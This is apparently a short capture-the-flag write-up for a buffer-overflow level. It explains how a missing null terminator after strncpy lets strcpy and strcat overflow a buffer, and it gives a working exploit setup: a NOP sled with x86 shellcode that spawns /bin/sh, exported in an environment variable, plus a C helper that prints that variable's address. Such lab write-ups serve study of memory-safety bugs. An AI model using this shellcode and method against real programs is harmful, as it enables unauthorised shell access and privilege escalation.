in this level the program use strncpy to copy the 20 characters read from stdin to a buffer
but that buffer has only length of 20 which does not leave enough space for null terminator
which lead to make the call of strcpy also copy aother buffer to be copied

and then strcat is called on the buffer and the other one which leads to an overflow
we can then make the program run a shellcode

for shellcode see: http://shell-storm.org/shellcode/files/shellcode-827.php
export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

#include <stdio.h>
int main(int argc, char *argv[]) {
	printf("%p\n", getenv(argv[1]));
	return 0;
}
